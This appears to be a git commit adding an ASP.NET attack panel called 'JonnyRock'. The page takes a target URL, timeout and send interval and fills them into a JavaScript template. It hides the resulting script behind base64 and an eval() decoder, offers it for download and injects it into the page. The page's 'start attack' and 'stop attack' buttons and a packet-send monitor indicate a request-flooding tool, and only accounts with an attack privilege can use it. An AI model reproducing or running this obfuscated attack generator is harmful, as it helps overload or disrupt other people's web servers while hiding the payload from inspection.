e7cdc943f59d534ccbd68fff2b68da887d36f9a0
unknown <a45688866@gmail.com>
2018-02-01 19:26:15 +0800

    master

---
+++ JonnyRock.aspx
@@ -0,0 +1,47 @@
+﻿<%@ Page Title="JonnyRock" Language="C#" MasterPageFile="~/FunctionPage.Master"  AutoEventWireup="true" CodeFile="JonnyRock.aspx.cs"  Inherits="_JonnyRock" enableEventValidation="false"%>
+
+
+<asp:Content ID="BodyContent" ContentPlaceHolderID="FunctionContent" runat="server">
+   
+    <h4 class="page-title"><%: Page.Title %></h4>
+                            <!-- Shortcuts -->
+                <div class="block-area shortcut-area">
+                    <asp:Literal ID="ll_shortcuts" runat="server"></asp:Literal>                        
+                </div>
+                
+                <hr class="whiter" />
+
+    <div>
+        <asp:Label ID="lb_url" runat="server" Text="目標網址:"></asp:Label>
+        <asp:TextBox  CssClass="form-control" ID="tb_url" runat="server">http://127.0.0.1/default.aspx</asp:TextBox>
+        <asp:Label ID="Label1" runat="server" Text="回報網址:"></asp:Label>
+        <asp:TextBox  CssClass="form-control" ID="tb_report" runat="server">http://127.0.0.1/default.aspx?uid=1&type=1</asp:TextBox>
+        <asp:Label ID="lb_timeot" runat="server" Text="Timeout(毫秒):"></asp:Label>
+        <asp:TextBox  CssClass="form-control" ID="tb_timeout" runat="server">0</asp:TextBox>
+        <asp:Label ID="lb_time" runat="server" Text="發送間隔(毫秒):"></asp:Label>
+        <asp:TextBox  CssClass="form-control" ID="tb_time" runat="server">500</asp:TextBox>
+        <asp:Button CssClass="btn btn-primary" ID="btn_submit" runat="server" Text="產生" OnClick="btn_submit_Click" />
+    </div>
+       
+        <a>加密原始碼:</a>
+    <div class="row">
+    <div class="col-md-6">
+        <asp:TextBox  CssClass="form-control" ID="tb_multline" TextMode ="MultiLine" runat="server" Height="300px" Width="50%"></asp:TextBox>
+      
+    </div>
+       
+    <div class="col-md-6">
+     <a>封包發送監控</a>
+    <textarea class="form-control" style="height:300px; width:50%;" rows="1000" cols="1000" value="" id="text_show">  </textarea>
+      
+      </div>
+        </div>
+    <div class="row">
+          <asp:HyperLink ID="HyperLink1" Visible ="false" runat="server">(右鍵另存指令碼)下載指令碼</asp:HyperLink>
+        <asp:Button CssClass="btn btn-primary" ID="btn_stop" runat="server" Text="停止攻擊" OnClick="btn_stop_Click" />
+       <asp:Button CssClass="btn btn-primary" ID="bt_write" runat="server" Text="開始攻擊"  OnClick="bt_write_Click" />
+      
+          
+            
+    </div>
+    </asp:Content>
---
+++ JonnyRock.aspx.cs
@@ -0,0 +1,115 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Web;
+using System.Web.UI;
+using System.Web.UI.WebControls;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Diagnostics;
+using System.Threading;
+
+
+public partial class _JonnyRock : System.Web.UI.Page
+{
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        try
+        {
+            Proc.MemberDetail md = (Proc.MemberDetail)Session[Proc.SESSION_DATA];
+            if (!md.priv_attack && !md.priv_admin)
+            {
+                Control cl = new Control();
+                Session.Clear();
+                Response.Redirect(cl.ResolveUrl("~/Login/Login.aspx"));
+            }
+        }
+        catch (Exception ex)
+        {
+            Control cl = new Control();
+            Session.Clear();
+            Response.Redirect(cl.ResolveUrl("~/Login/Login.aspx"));
+        }
+        if (!IsPostBack)
+        {
+            Control cl = new Control();
+
+           ll_shortcuts.Text = InterfaceHelper.ItemlistHelper.shortcuts();
+
+        }
+    }
+    private string Encoding64(string str)
+    {
+        return Convert.ToBase64String(Encoding.UTF8.GetBytes(str));
+    }
+
+    private string Decodind64(string str)
+    {
+        return Encoding.UTF8.GetString(Convert.FromBase64String(str));
+    }
+
+    protected  void  btn_submit_Click(object sender, EventArgs e)
+    {
+        createTmp();
+    }
+
+
+    public string createTmp()
+    {
+        try
+        {
+            string s = "";
+            //   string result = rdb_a.Checked == true ? "" : rdb_b.Checked == true ? rdb_b.Text : rdb_c.Checked == true ? rdb_c.Text : rdb_d.Checked == true ? rdb_d.Text : rdb_e.Checked == true ? rdb_e.Text : "";
+            string path = Server.MapPath(@"temp\");
+            string template_path = Server.MapPath(@"temp\");
+            using (StreamReader sr = new StreamReader(string.Format("{0}{1}", template_path, "temp.js")))
+            {
+                //MessageBox.Show();
+                s = sr.ReadToEnd();
+                s = s.Replace("{0}", tb_url.Text)
+                      .Replace("{1}", tb_timeout.Text)
+                      .Replace("{2}", tb_time.Text);
+                      //.Replace("{3}", tb_report.Text);
+            }
+            string enc = Encoding64(s);  //加密
+
+            string temp =
+             "function decodeBase(str){" +
+             "return decodeURIComponent(Array.prototype.map.call(atob(str), function(c){" +
+                    "return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);" +
+                "}).join(''));}" +
+            "eval(decodeBase('{0}'));  ";  //解密
+            tb_multline.Text = temp.Replace("{0}", enc);
+
+            // label8.Text = temp.Replace("{0}", enc);
+            using (StreamWriter sw = new StreamWriter(string.Format("{0}{1}", path, "rocktest.js")))
+            {
+                sw.Write(temp.Replace("{0}", enc));
+            }
+            Response.Write("<script>"+"產生成功" + path + "rocktest.js"+"</script>");
+            HyperLink1.Visible = true;
+            HyperLink1.NavigateUrl = @"temp\rocktest.js";
+            // label13.Text = path + text_name.Text + ".html";
+            // readFile(cb_filename);
+            return temp.Replace("{0}", enc);
+        }
+        catch (Exception ex)
+        {
+            Response.Write(ex.Message);
+        }
+        return "";
+    }
+    protected void bt_write_Click(object sender, EventArgs e)
+    {
+        Response.Write(string.Format("<script>{0}</script>", tb_multline.Text));
+    }
+
+    protected void btn_stop_Click(object sender, EventArgs e)
+    {
+        Response.Redirect("JonnyRock.aspx");
+    }
+}
